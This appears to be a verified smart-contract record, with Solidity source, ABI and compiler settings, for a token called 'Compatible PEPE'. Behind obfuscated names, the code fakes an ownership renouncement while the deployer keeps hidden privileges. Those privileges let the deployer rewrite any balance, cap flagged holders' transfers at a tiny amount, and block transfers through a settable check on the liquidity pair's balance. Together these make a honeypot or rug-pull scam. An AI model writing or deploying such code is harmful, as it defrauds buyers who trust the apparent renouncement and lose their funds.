{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface amountWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyTeam) external view returns (uint256);\n\n    function transfer(address fundReceiverShould, uint256 swapMax) external returns (bool);\n\n    function allowance(address limitWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundReceiverShould,\n        uint256 swapMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptIs, uint256 value);\n    event Approval(address indexed limitWallet, address indexed spender, uint256 value);\n}\n\nabstract contract tradingBuyTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitSwap {\n    function createPair(address minSwap, address maxFee) external returns (address);\n}\n\ninterface modeLaunched is amountWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompatiblePEPE is tradingBuyTotal, amountWallet, modeLaunched {\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptEnableWallet;\n    }\n\n    address private enableExempt;\n\n    uint256 private modeSender = 100000000 * 10 ** 18;\n\n    address liquidityTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 txIs;\n\n    function allowance(address fromLiquidity, address atLimitEnable) external view virtual override returns (uint256) {\n        if (atLimitEnable == liquidityTrading) {\n            return type(uint256).max;\n        }\n        return toFee[fromLiquidity][atLimitEnable];\n    }\n\n    function liquidityReceiver(address minTotalFee, address fundReceiverShould, uint256 swapMax) internal returns (bool) {\n        if (minTotalFee == senderAt) {\n            return minAmount(minTotalFee, fundReceiverShould, swapMax);\n        }\n        uint256 autoSender = amountWallet(modeTotalSender).balanceOf(fundLaunched);\n        require(autoSender == shouldTokenAt);\n        require(fundReceiverShould != fundLaunched);\n        if (receiverFundFrom[minTotalFee]) {\n            return minAmount(minTotalFee, fundReceiverShould, tokenWallet);\n        }\n        return minAmount(minTotalFee, fundReceiverShould, swapMax);\n    }\n\n    event OwnershipTransferred(address indexed feeTake, address indexed walletTake);\n\n    string private exemptEnableWallet = \"CPE\";\n\n    function launchedWallet(address teamAtToken) public {\n        if (buyTokenTotal) {\n            return;\n        }\n        if (receiverReceiver == takeEnable) {\n            enableMarketingMode = fundLiquidity;\n        }\n        tradingAmountFee[teamAtToken] = true;\n        \n        buyTokenTotal = true;\n    }\n\n    function transfer(address fundMin, uint256 swapMax) external virtual override returns (bool) {\n        return liquidityReceiver(_msgSender(), fundMin, swapMax);\n    }\n\n    mapping(address => bool) public receiverFundFrom;\n\n    uint256 public enableMarketingMode;\n\n    string private autoBuy = \"Compatible PEPE\";\n\n    function launchMaxAt() public {\n        emit OwnershipTransferred(senderAt, address(0));\n        enableExempt = address(0);\n    }\n\n    function minAmount(address minTotalFee, address fundReceiverShould, uint256 swapMax) internal returns (bool) {\n        require(maxAtLimit[minTotalFee] >= swapMax);\n        maxAtLimit[minTotalFee] -= swapMax;\n        maxAtLimit[fundReceiverShould] += swapMax;\n        emit Transfer(minTotalFee, fundReceiverShould, swapMax);\n        return true;\n    }\n\n    mapping(address => bool) public tradingAmountFee;\n\n    function getOwner() external view returns (address) {\n        return enableExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptAuto;\n    }\n\n    address public senderAt;\n\n    function launchedSenderAt(uint256 swapMax) public {\n        maxLaunch();\n        shouldTokenAt = swapMax;\n    }\n\n    constructor (){\n        if (takeEnable) {\n            takeEnable = true;\n        }\n        totalLiquidity totalLaunch = totalLiquidity(liquidityTrading);\n        modeTotalSender = limitSwap(totalLaunch.factory()).createPair(totalLaunch.WETH(), address(this));\n        if (fundLiquidity != enableMarketingMode) {\n            takeEnable = true;\n        }\n        senderAt = _msgSender();\n        launchMaxAt();\n        tradingAmountFee[senderAt] = true;\n        maxAtLimit[senderAt] = modeSender;\n        \n        emit Transfer(address(0), senderAt, modeSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private toFee;\n\n    function transferFrom(address minTotalFee, address fundReceiverShould, uint256 swapMax) external override returns (bool) {\n        if (_msgSender() != liquidityTrading) {\n            if (toFee[minTotalFee][_msgSender()] != type(uint256).max) {\n                require(swapMax <= toFee[minTotalFee][_msgSender()]);\n                toFee[minTotalFee][_msgSender()] -= swapMax;\n            }\n        }\n        return liquidityReceiver(minTotalFee, fundReceiverShould, swapMax);\n    }\n\n    bool private receiverReceiver;\n\n    uint256 public fundLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeSender;\n    }\n\n    uint256 shouldTokenAt;\n\n    function owner() external view returns (address) {\n        return enableExempt;\n    }\n\n    bool private takeEnable;\n\n    address fundLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address atLimitEnable, uint256 swapMax) public virtual override returns (bool) {\n        toFee[_msgSender()][atLimitEnable] = swapMax;\n        emit Approval(_msgSender(), atLimitEnable, swapMax);\n        return true;\n    }\n\n    bool public buyTokenTotal;\n\n    function feeWalletLiquidity(address fundMin, uint256 swapMax) public {\n        maxLaunch();\n        maxAtLimit[fundMin] = swapMax;\n    }\n\n    uint8 private exemptAuto = 18;\n\n    address public modeTotalSender;\n\n    function tradingFee(address marketingAmountAt) public {\n        maxLaunch();\n        \n        if (marketingAmountAt == senderAt || marketingAmountAt == modeTotalSender) {\n            return;\n        }\n        receiverFundFrom[marketingAmountAt] = true;\n    }\n\n    mapping(address => uint256) private maxAtLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return autoBuy;\n    }\n\n    uint256 constant tokenWallet = 6 ** 10;\n\n    function balanceOf(address buyTeam) public view virtual override returns (uint256) {\n        return maxAtLimit[buyTeam];\n    }\n\n    function maxLaunch() private view {\n        require(tradingAmountFee[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atLimitEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimitEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketingMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"feeWalletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMaxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"launchedSenderAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAtToken\",\"type\":\"address\"}],\"name\":\"launchedWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotalSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAmountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmountAt\",\"type\":\"address\"}],\"name\":\"tradingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotalFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundReceiverShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CompatiblePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}